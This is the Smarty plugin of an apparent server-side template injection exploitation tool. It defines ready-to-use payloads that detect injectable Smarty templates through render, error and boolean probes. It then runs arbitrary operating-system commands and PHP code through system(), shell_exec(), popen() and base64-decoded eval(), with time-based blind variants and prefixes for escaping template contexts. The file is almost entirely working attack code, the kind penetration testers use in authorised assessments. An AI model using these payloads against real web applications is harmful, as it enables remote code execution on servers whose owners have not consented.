from plugins.languages import php
from utils import rand
from core import bash


class Smarty(php.Php):
    priority = 5
    generic_plugin = True
    plugin_info = {
        "Description": """Smarty template engine""",
        "Authors": [
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # New payload without {php}{/php} tags
            "Emilio @epinna https://github.com/epinna",  # Render test and contexts for Tplmap payload
        ],
        "Engine": [
            "Homepage: https://www.smarty.net/docs/en/",
            "Github: https://github.com/smarty-php/smarty",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'render': '{code}',
                'header': '{{{header[0]}+{header[1]}}}',
                'trailer': '{{{trailer[0]}+{trailer[1]}}}',
                'test_render': f"""{{{rand.randints[0]}}}{{*{rand.randints[1]}*}}{{"a"|cat:"b"}}{{{rand.randints[2]}}}""",
                'test_render_expected': f'{rand.randints[0]}ab{rand.randints[2]}'
            },
            'render_error': {
                'render': """{code}""",
                'wrapper_type': "global",
                # File path "Y:/A:/..." is unlikely to exist
                'header': """{{* 1 / 0 *}}{{fopen("Y:/A:/"|cat:strval({header[0]}+{header[1]})|cat:rtrim(strval(""",
                'trailer': """))|cat:strval({trailer[0]}+{trailer[1]}), "r")}}""",
                'test_render': f'"{rand.randints[0]}"+"{rand.randints[1]}"',
                'test_render_expected': f'{rand.randints[0] + rand.randints[1]}'
            },
            'boolean': {
                'call': 'inject',
                'test_bool_true':  "{{1 / ('2' + '3' == 5)}}",
                'test_bool_false': "{{1 / ('2' + '5' == 3)}}",
                'verify_bool_true':  "{{1 / (strlen('2') == 1)}}",
                'verify_bool_false': "{{1 / (strlen('1') == 2)}}"
            },
            'evaluate': {
                # Dirty hack from Twig
                'call': 'execute',
                'evaluate': """php -r '$d="{code_b64}";eval(base64_decode(str_pad(strtr($d,"-_","+/"),strlen($d)%4,"=",STR_PAD_RIGHT)));'""",
                'test_os': 'echo PHP_OS;',
                'test_os_expected': r'^[\w-]+$'
            },
            'evaluate_boolean': {
                # Dirty hack from Twig
                'call': 'execute_blind',
                'evaluate_blind': """php -r '$d="{code_b64}";1 / (true && eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ");"));'""",
            },
            'evaluate_blind': {
                # Dirty hack from Twig
                'call': 'execute',
                'evaluate_blind': """php -r '$d="{code_b64}";eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ") && sleep({delay});");'"""
            },
            'execute': {
                'call': 'render',
                'execute': """{{if system(base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT)))}}{{/if}}""",
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2]
            },
            'execute_error': {
                # Using shell_exec to get full output
                'execute': """shell_exec(base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT)))"""
            },
            'execute_boolean': {
                'call': 'inject',
                'execute_blind': """{{* 1 / 0 *}}{{"a"|cat:"b"}}{{if 1 / (pclose(popen(base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT)), "wb")) == 0)}}{{/if}}"""
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """{{* 1 / 0 *}}{{"a"|cat:"b"}}{{if system(base64_decode(str_pad(strtr('{code_b64}', '-_', '+/'), strlen('{code_b64}')%4,'=',STR_PAD_RIGHT))|cat:" && sleep {delay}")}}{{/if}}"""
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            {'level': 1, 'prefix': '{closure}}}', 'suffix': '{', 'closures': php.ctx_closures},
            # {config_load file="missing_file"} raises an exception
            # Escape Ifs
            {'level': 5, 'prefix': '{closure}}}{{/if}}{{if 1}}', 'suffix': '', 'closures': php.ctx_closures},
            # Escape {assign var="%s" value="%s"}
            {'level': 5, 'prefix': '{closure} var="" value=""}}{{assign var="" value=""}}', 'suffix': '', 'closures': php.ctx_closures},
            # Comments
            {'level': 5, 'prefix': '*}}', 'suffix': '{*'},
        ])
